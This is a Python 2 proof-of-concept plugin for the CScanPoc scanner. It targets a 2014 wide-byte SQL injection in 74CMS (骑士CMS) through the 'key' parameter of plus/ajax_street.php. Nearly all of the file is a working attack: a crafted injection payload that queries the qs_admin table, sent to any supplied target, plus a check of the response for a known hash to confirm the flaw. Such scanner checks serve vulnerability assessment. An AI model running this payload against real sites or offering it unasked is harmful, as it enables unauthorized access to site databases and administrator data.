# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = '74CMS_0005'  # 平台漏洞编号，留空
    name = '骑士CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-11'  # 漏洞公布时间
    desc = '''
        代码出现在 plus/ajax_street.php文件中
        $key=trim($_GET['key']); 出现宽字节注入，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1240/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b63b14d3-f278-4726-8436-fd9d2d80f842'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/upload/plus/ajax_street.php?act=key&key=s%e9%8c%a6' or cast(ascii(substring((select md5(c) from qs_admin),1,1))=97 as signed) %23"
            url = self.target + payload
            r = requests.post(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
